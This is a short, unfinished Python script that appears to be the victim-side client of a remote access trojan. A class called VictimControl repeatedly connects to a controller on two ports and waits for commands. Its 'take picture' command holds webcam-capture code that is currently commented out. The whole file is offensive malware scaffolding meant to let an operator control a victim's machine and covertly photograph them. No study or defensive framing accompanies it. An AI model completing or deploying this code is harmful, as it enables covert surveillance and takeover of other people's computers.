import socket
import cv2
import os
import pickle

# Todo: Fix script structure
# Todo: Seperate script using classes etc..


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


HOST = socket.gethostname()
PORT = 55555
DATA_PORT = 44444
buffer = 1024
attempt_count = 1


class VictimControl(object):
    def __init__(self, main, data):
        self.main_conn = main
        self.data_conn = data

    def receive_command(self):
        while True:
            cmd = main_socket.recv(buffer).decode('utf-8')
            print(cmd)

            if cmd == 'take picture':
                pass
                # camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                # return_value, image = camera.read()
                # cv2.imwrite('image.png', image)
                # camera.release()
                # cv2.destroyAllWindows()


if __name__ == '__main__':
    main_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    data_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            main_socket.connect((HOST, PORT))
            data_socket.connect((HOST, DATA_PORT))
            break
        except ConnectionRefusedError:
            clear_screen()
            print(f' Failed to connect {attempt_count} times!')
            attempt_count += 1

    victim = VictimControl(main_socket, data_socket)
    victim.receive_command()